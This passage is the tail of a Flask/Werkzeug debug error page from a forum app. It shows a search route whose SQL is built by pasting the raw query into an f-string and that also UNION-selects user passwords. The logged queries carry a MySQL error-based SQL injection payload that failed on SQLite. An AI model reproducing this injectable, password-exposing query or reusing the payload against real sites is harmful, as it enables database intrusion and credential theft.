  File &#34;F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\base.py&#34;, line 1983, in _exec_single_context
    self._handle_dbapi_exception(
  File &#34;F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\base.py&#34;, line 2352, in _handle_dbapi_exception
    raise sqlalchemy_exception.with_traceback(exc_info[2]) from e
  File &#34;F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\base.py&#34;, line 1964, in _exec_single_context
    self.dialect.do_execute(
  File &#34;F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\default.py&#34;, line 945, in do_execute
    cursor.execute(statement, parameters)
sqlalchemy.exc.OperationalError: (sqlite3.OperationalError) no such table: information_schema.tables
[SQL: SELECT id, title, content, user_id, &#39;post&#39; as type FROM post WHERE title LIKE &#39;%&#39; AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT &#39;break&#39;),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --%&#39; OR content LIKE &#39;%&#39; AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT &#39;break&#39;),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --%&#39; UNION SELECT id, username, password, NULL, &#39;user&#39; as type FROM user WHERE username LIKE &#39;%&#39; AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT &#39;break&#39;),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --%&#39; OR password LIKE &#39;%&#39; AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT &#39;break&#39;),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --%&#39;]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
</textarea>
</div>
<div class="explanation">
  The debugger caught an exception in your WSGI application.  You can now
  look at the traceback which led to the error.  <span class="nojavascript">
  If you enable JavaScript you can also use additional features such as code
  execution (if the evalex feature is enabled), automatic pasting of the
  exceptions and much more.</span>
</div>
      <div class="footer">
        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
        friendly Werkzeug powered traceback interpreter.
      </div>
    </div>

    <div class="pin-prompt">
      <div class="inner">
        <h3>Console Locked</h3>
        <p>
          The console is locked and needs to be unlocked by entering the PIN.
          You can find the PIN printed out on the standard output of your
          shell that runs the server.
        <form>
          <p>PIN:
            <input type=text name=pin size=14>
            <input type=submit name=btn value="Confirm Pin">
        </form>
      </div>
    </div>
  </body>
</html>

<!--

Traceback (most recent call last):
  File "F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\base.py", line 1964, in _exec_single_context
    self.dialect.do_execute(
  File "F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\default.py", line 945, in do_execute
    cursor.execute(statement, parameters)
sqlite3.OperationalError: no such table: information_schema.tables

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "F:\project\forum\myenv\Lib\site-packages\flask\app.py", line 1536, in __call__
    return self.wsgi_app(environ, start_response)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "F:\project\forum\myenv\Lib\site-packages\flask\app.py", line 1514, in wsgi_app
    response = self.handle_exception(e)
               ^^^^^^^^^^^^^^^^^^^^^^^^
  File "F:\project\forum\myenv\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
    response = self.full_dispatch_request()
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "F:\project\forum\myenv\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
    rv = self.handle_user_exception(e)
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "F:\project\forum\myenv\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
    rv = self.dispatch_request()
         ^^^^^^^^^^^^^^^^^^^^^^^
  File "F:\project\forum\myenv\Lib\site-packages\flask\app.py", line 902, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "F:\project\forum\app.py", line 422, in search
    results = db.session.execute(text(f"SELECT id, title, content, user_id, 'post' as type FROM post WHERE title LIKE '%{query}%' OR content LIKE '%{query}%' UNION SELECT id, username, password, NULL, 'user' as type FROM user WHERE username LIKE '%{query}%' OR password LIKE '%{query}%'")).fetchall()
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "F:\project\forum\myenv\Lib\site-packages\sqlalchemy\orm\scoping.py", line 779, in execute
    return self._proxied.execute(
           ^^^^^^^^^^^^^^^^^^^^^^
  File "F:\project\forum\myenv\Lib\site-packages\sqlalchemy\orm\session.py", line 2365, in execute
    return self._execute_internal(
           ^^^^^^^^^^^^^^^^^^^^^^^
  File "F:\project\forum\myenv\Lib\site-packages\sqlalchemy\orm\session.py", line 2260, in _execute_internal
    result = conn.execute(
             ^^^^^^^^^^^^^
  File "F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\base.py", line 1416, in execute
    return meth(
           ^^^^^
  File "F:\project\forum\myenv\Lib\site-packages\sqlalchemy\sql\elements.py", line 523, in _execute_on_connection
    return connection._execute_clauseelement(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\base.py", line 1638, in _execute_clauseelement
    ret = self._execute_context(
          ^^^^^^^^^^^^^^^^^^^^^^
  File "F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\base.py", line 1843, in _execute_context
    return self._exec_single_context(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\base.py", line 1983, in _exec_single_context
    self._handle_dbapi_exception(
  File "F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\base.py", line 2352, in _handle_dbapi_exception
    raise sqlalchemy_exception.with_traceback(exc_info[2]) from e
  File "F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\base.py", line 1964, in _exec_single_context
    self.dialect.do_execute(
  File "F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\default.py", line 945, in do_execute
    cursor.execute(statement, parameters)
sqlalchemy.exc.OperationalError: (sqlite3.OperationalError) no such table: information_schema.tables
[SQL: SELECT id, title, content, user_id, 'post' as type FROM post WHERE title LIKE '%' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT 'break'),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -%' OR content LIKE '%' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT 'break'),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -%' UNION SELECT id, username, password, NULL, 'user' as type FROM user WHERE username LIKE '%' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT 'break'),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -%' OR password LIKE '%' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT 'break'),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -%']
(Background on this error at: https://sqlalche.me/e/20/e3q8)


-->
